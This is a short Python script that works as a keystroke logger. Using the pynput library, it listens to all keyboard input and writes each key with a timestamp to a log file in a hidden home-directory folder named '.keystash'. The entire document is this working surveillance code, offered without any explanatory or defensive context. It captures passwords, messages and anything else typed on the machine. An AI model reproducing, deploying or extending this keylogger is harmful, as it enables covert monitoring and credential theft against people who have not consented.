from pynput import keyboard
import os
import datetime

# Configuration
LOG_DIR = os.path.expanduser("~/.keystash/")
LOG_FILE = os.path.join(LOG_DIR, "keylog.txt")
os.makedirs(LOG_DIR, exist_ok=True)

def write_log(key):
    with open(LOG_FILE, "a") as f:
        f.write(f"{datetime.datetime.now()} - {key}\n")

def on_press(key):
    try:
        if hasattr(key, 'char') and key.char is not None:
            write_log(key.char)
        else:
            write_log(f"[{key.name}]")
    except Exception as e:
        write_log(f"[ERROR: {e}]")

with keyboard.Listener(on_press=on_press) as listener:
    listener.join()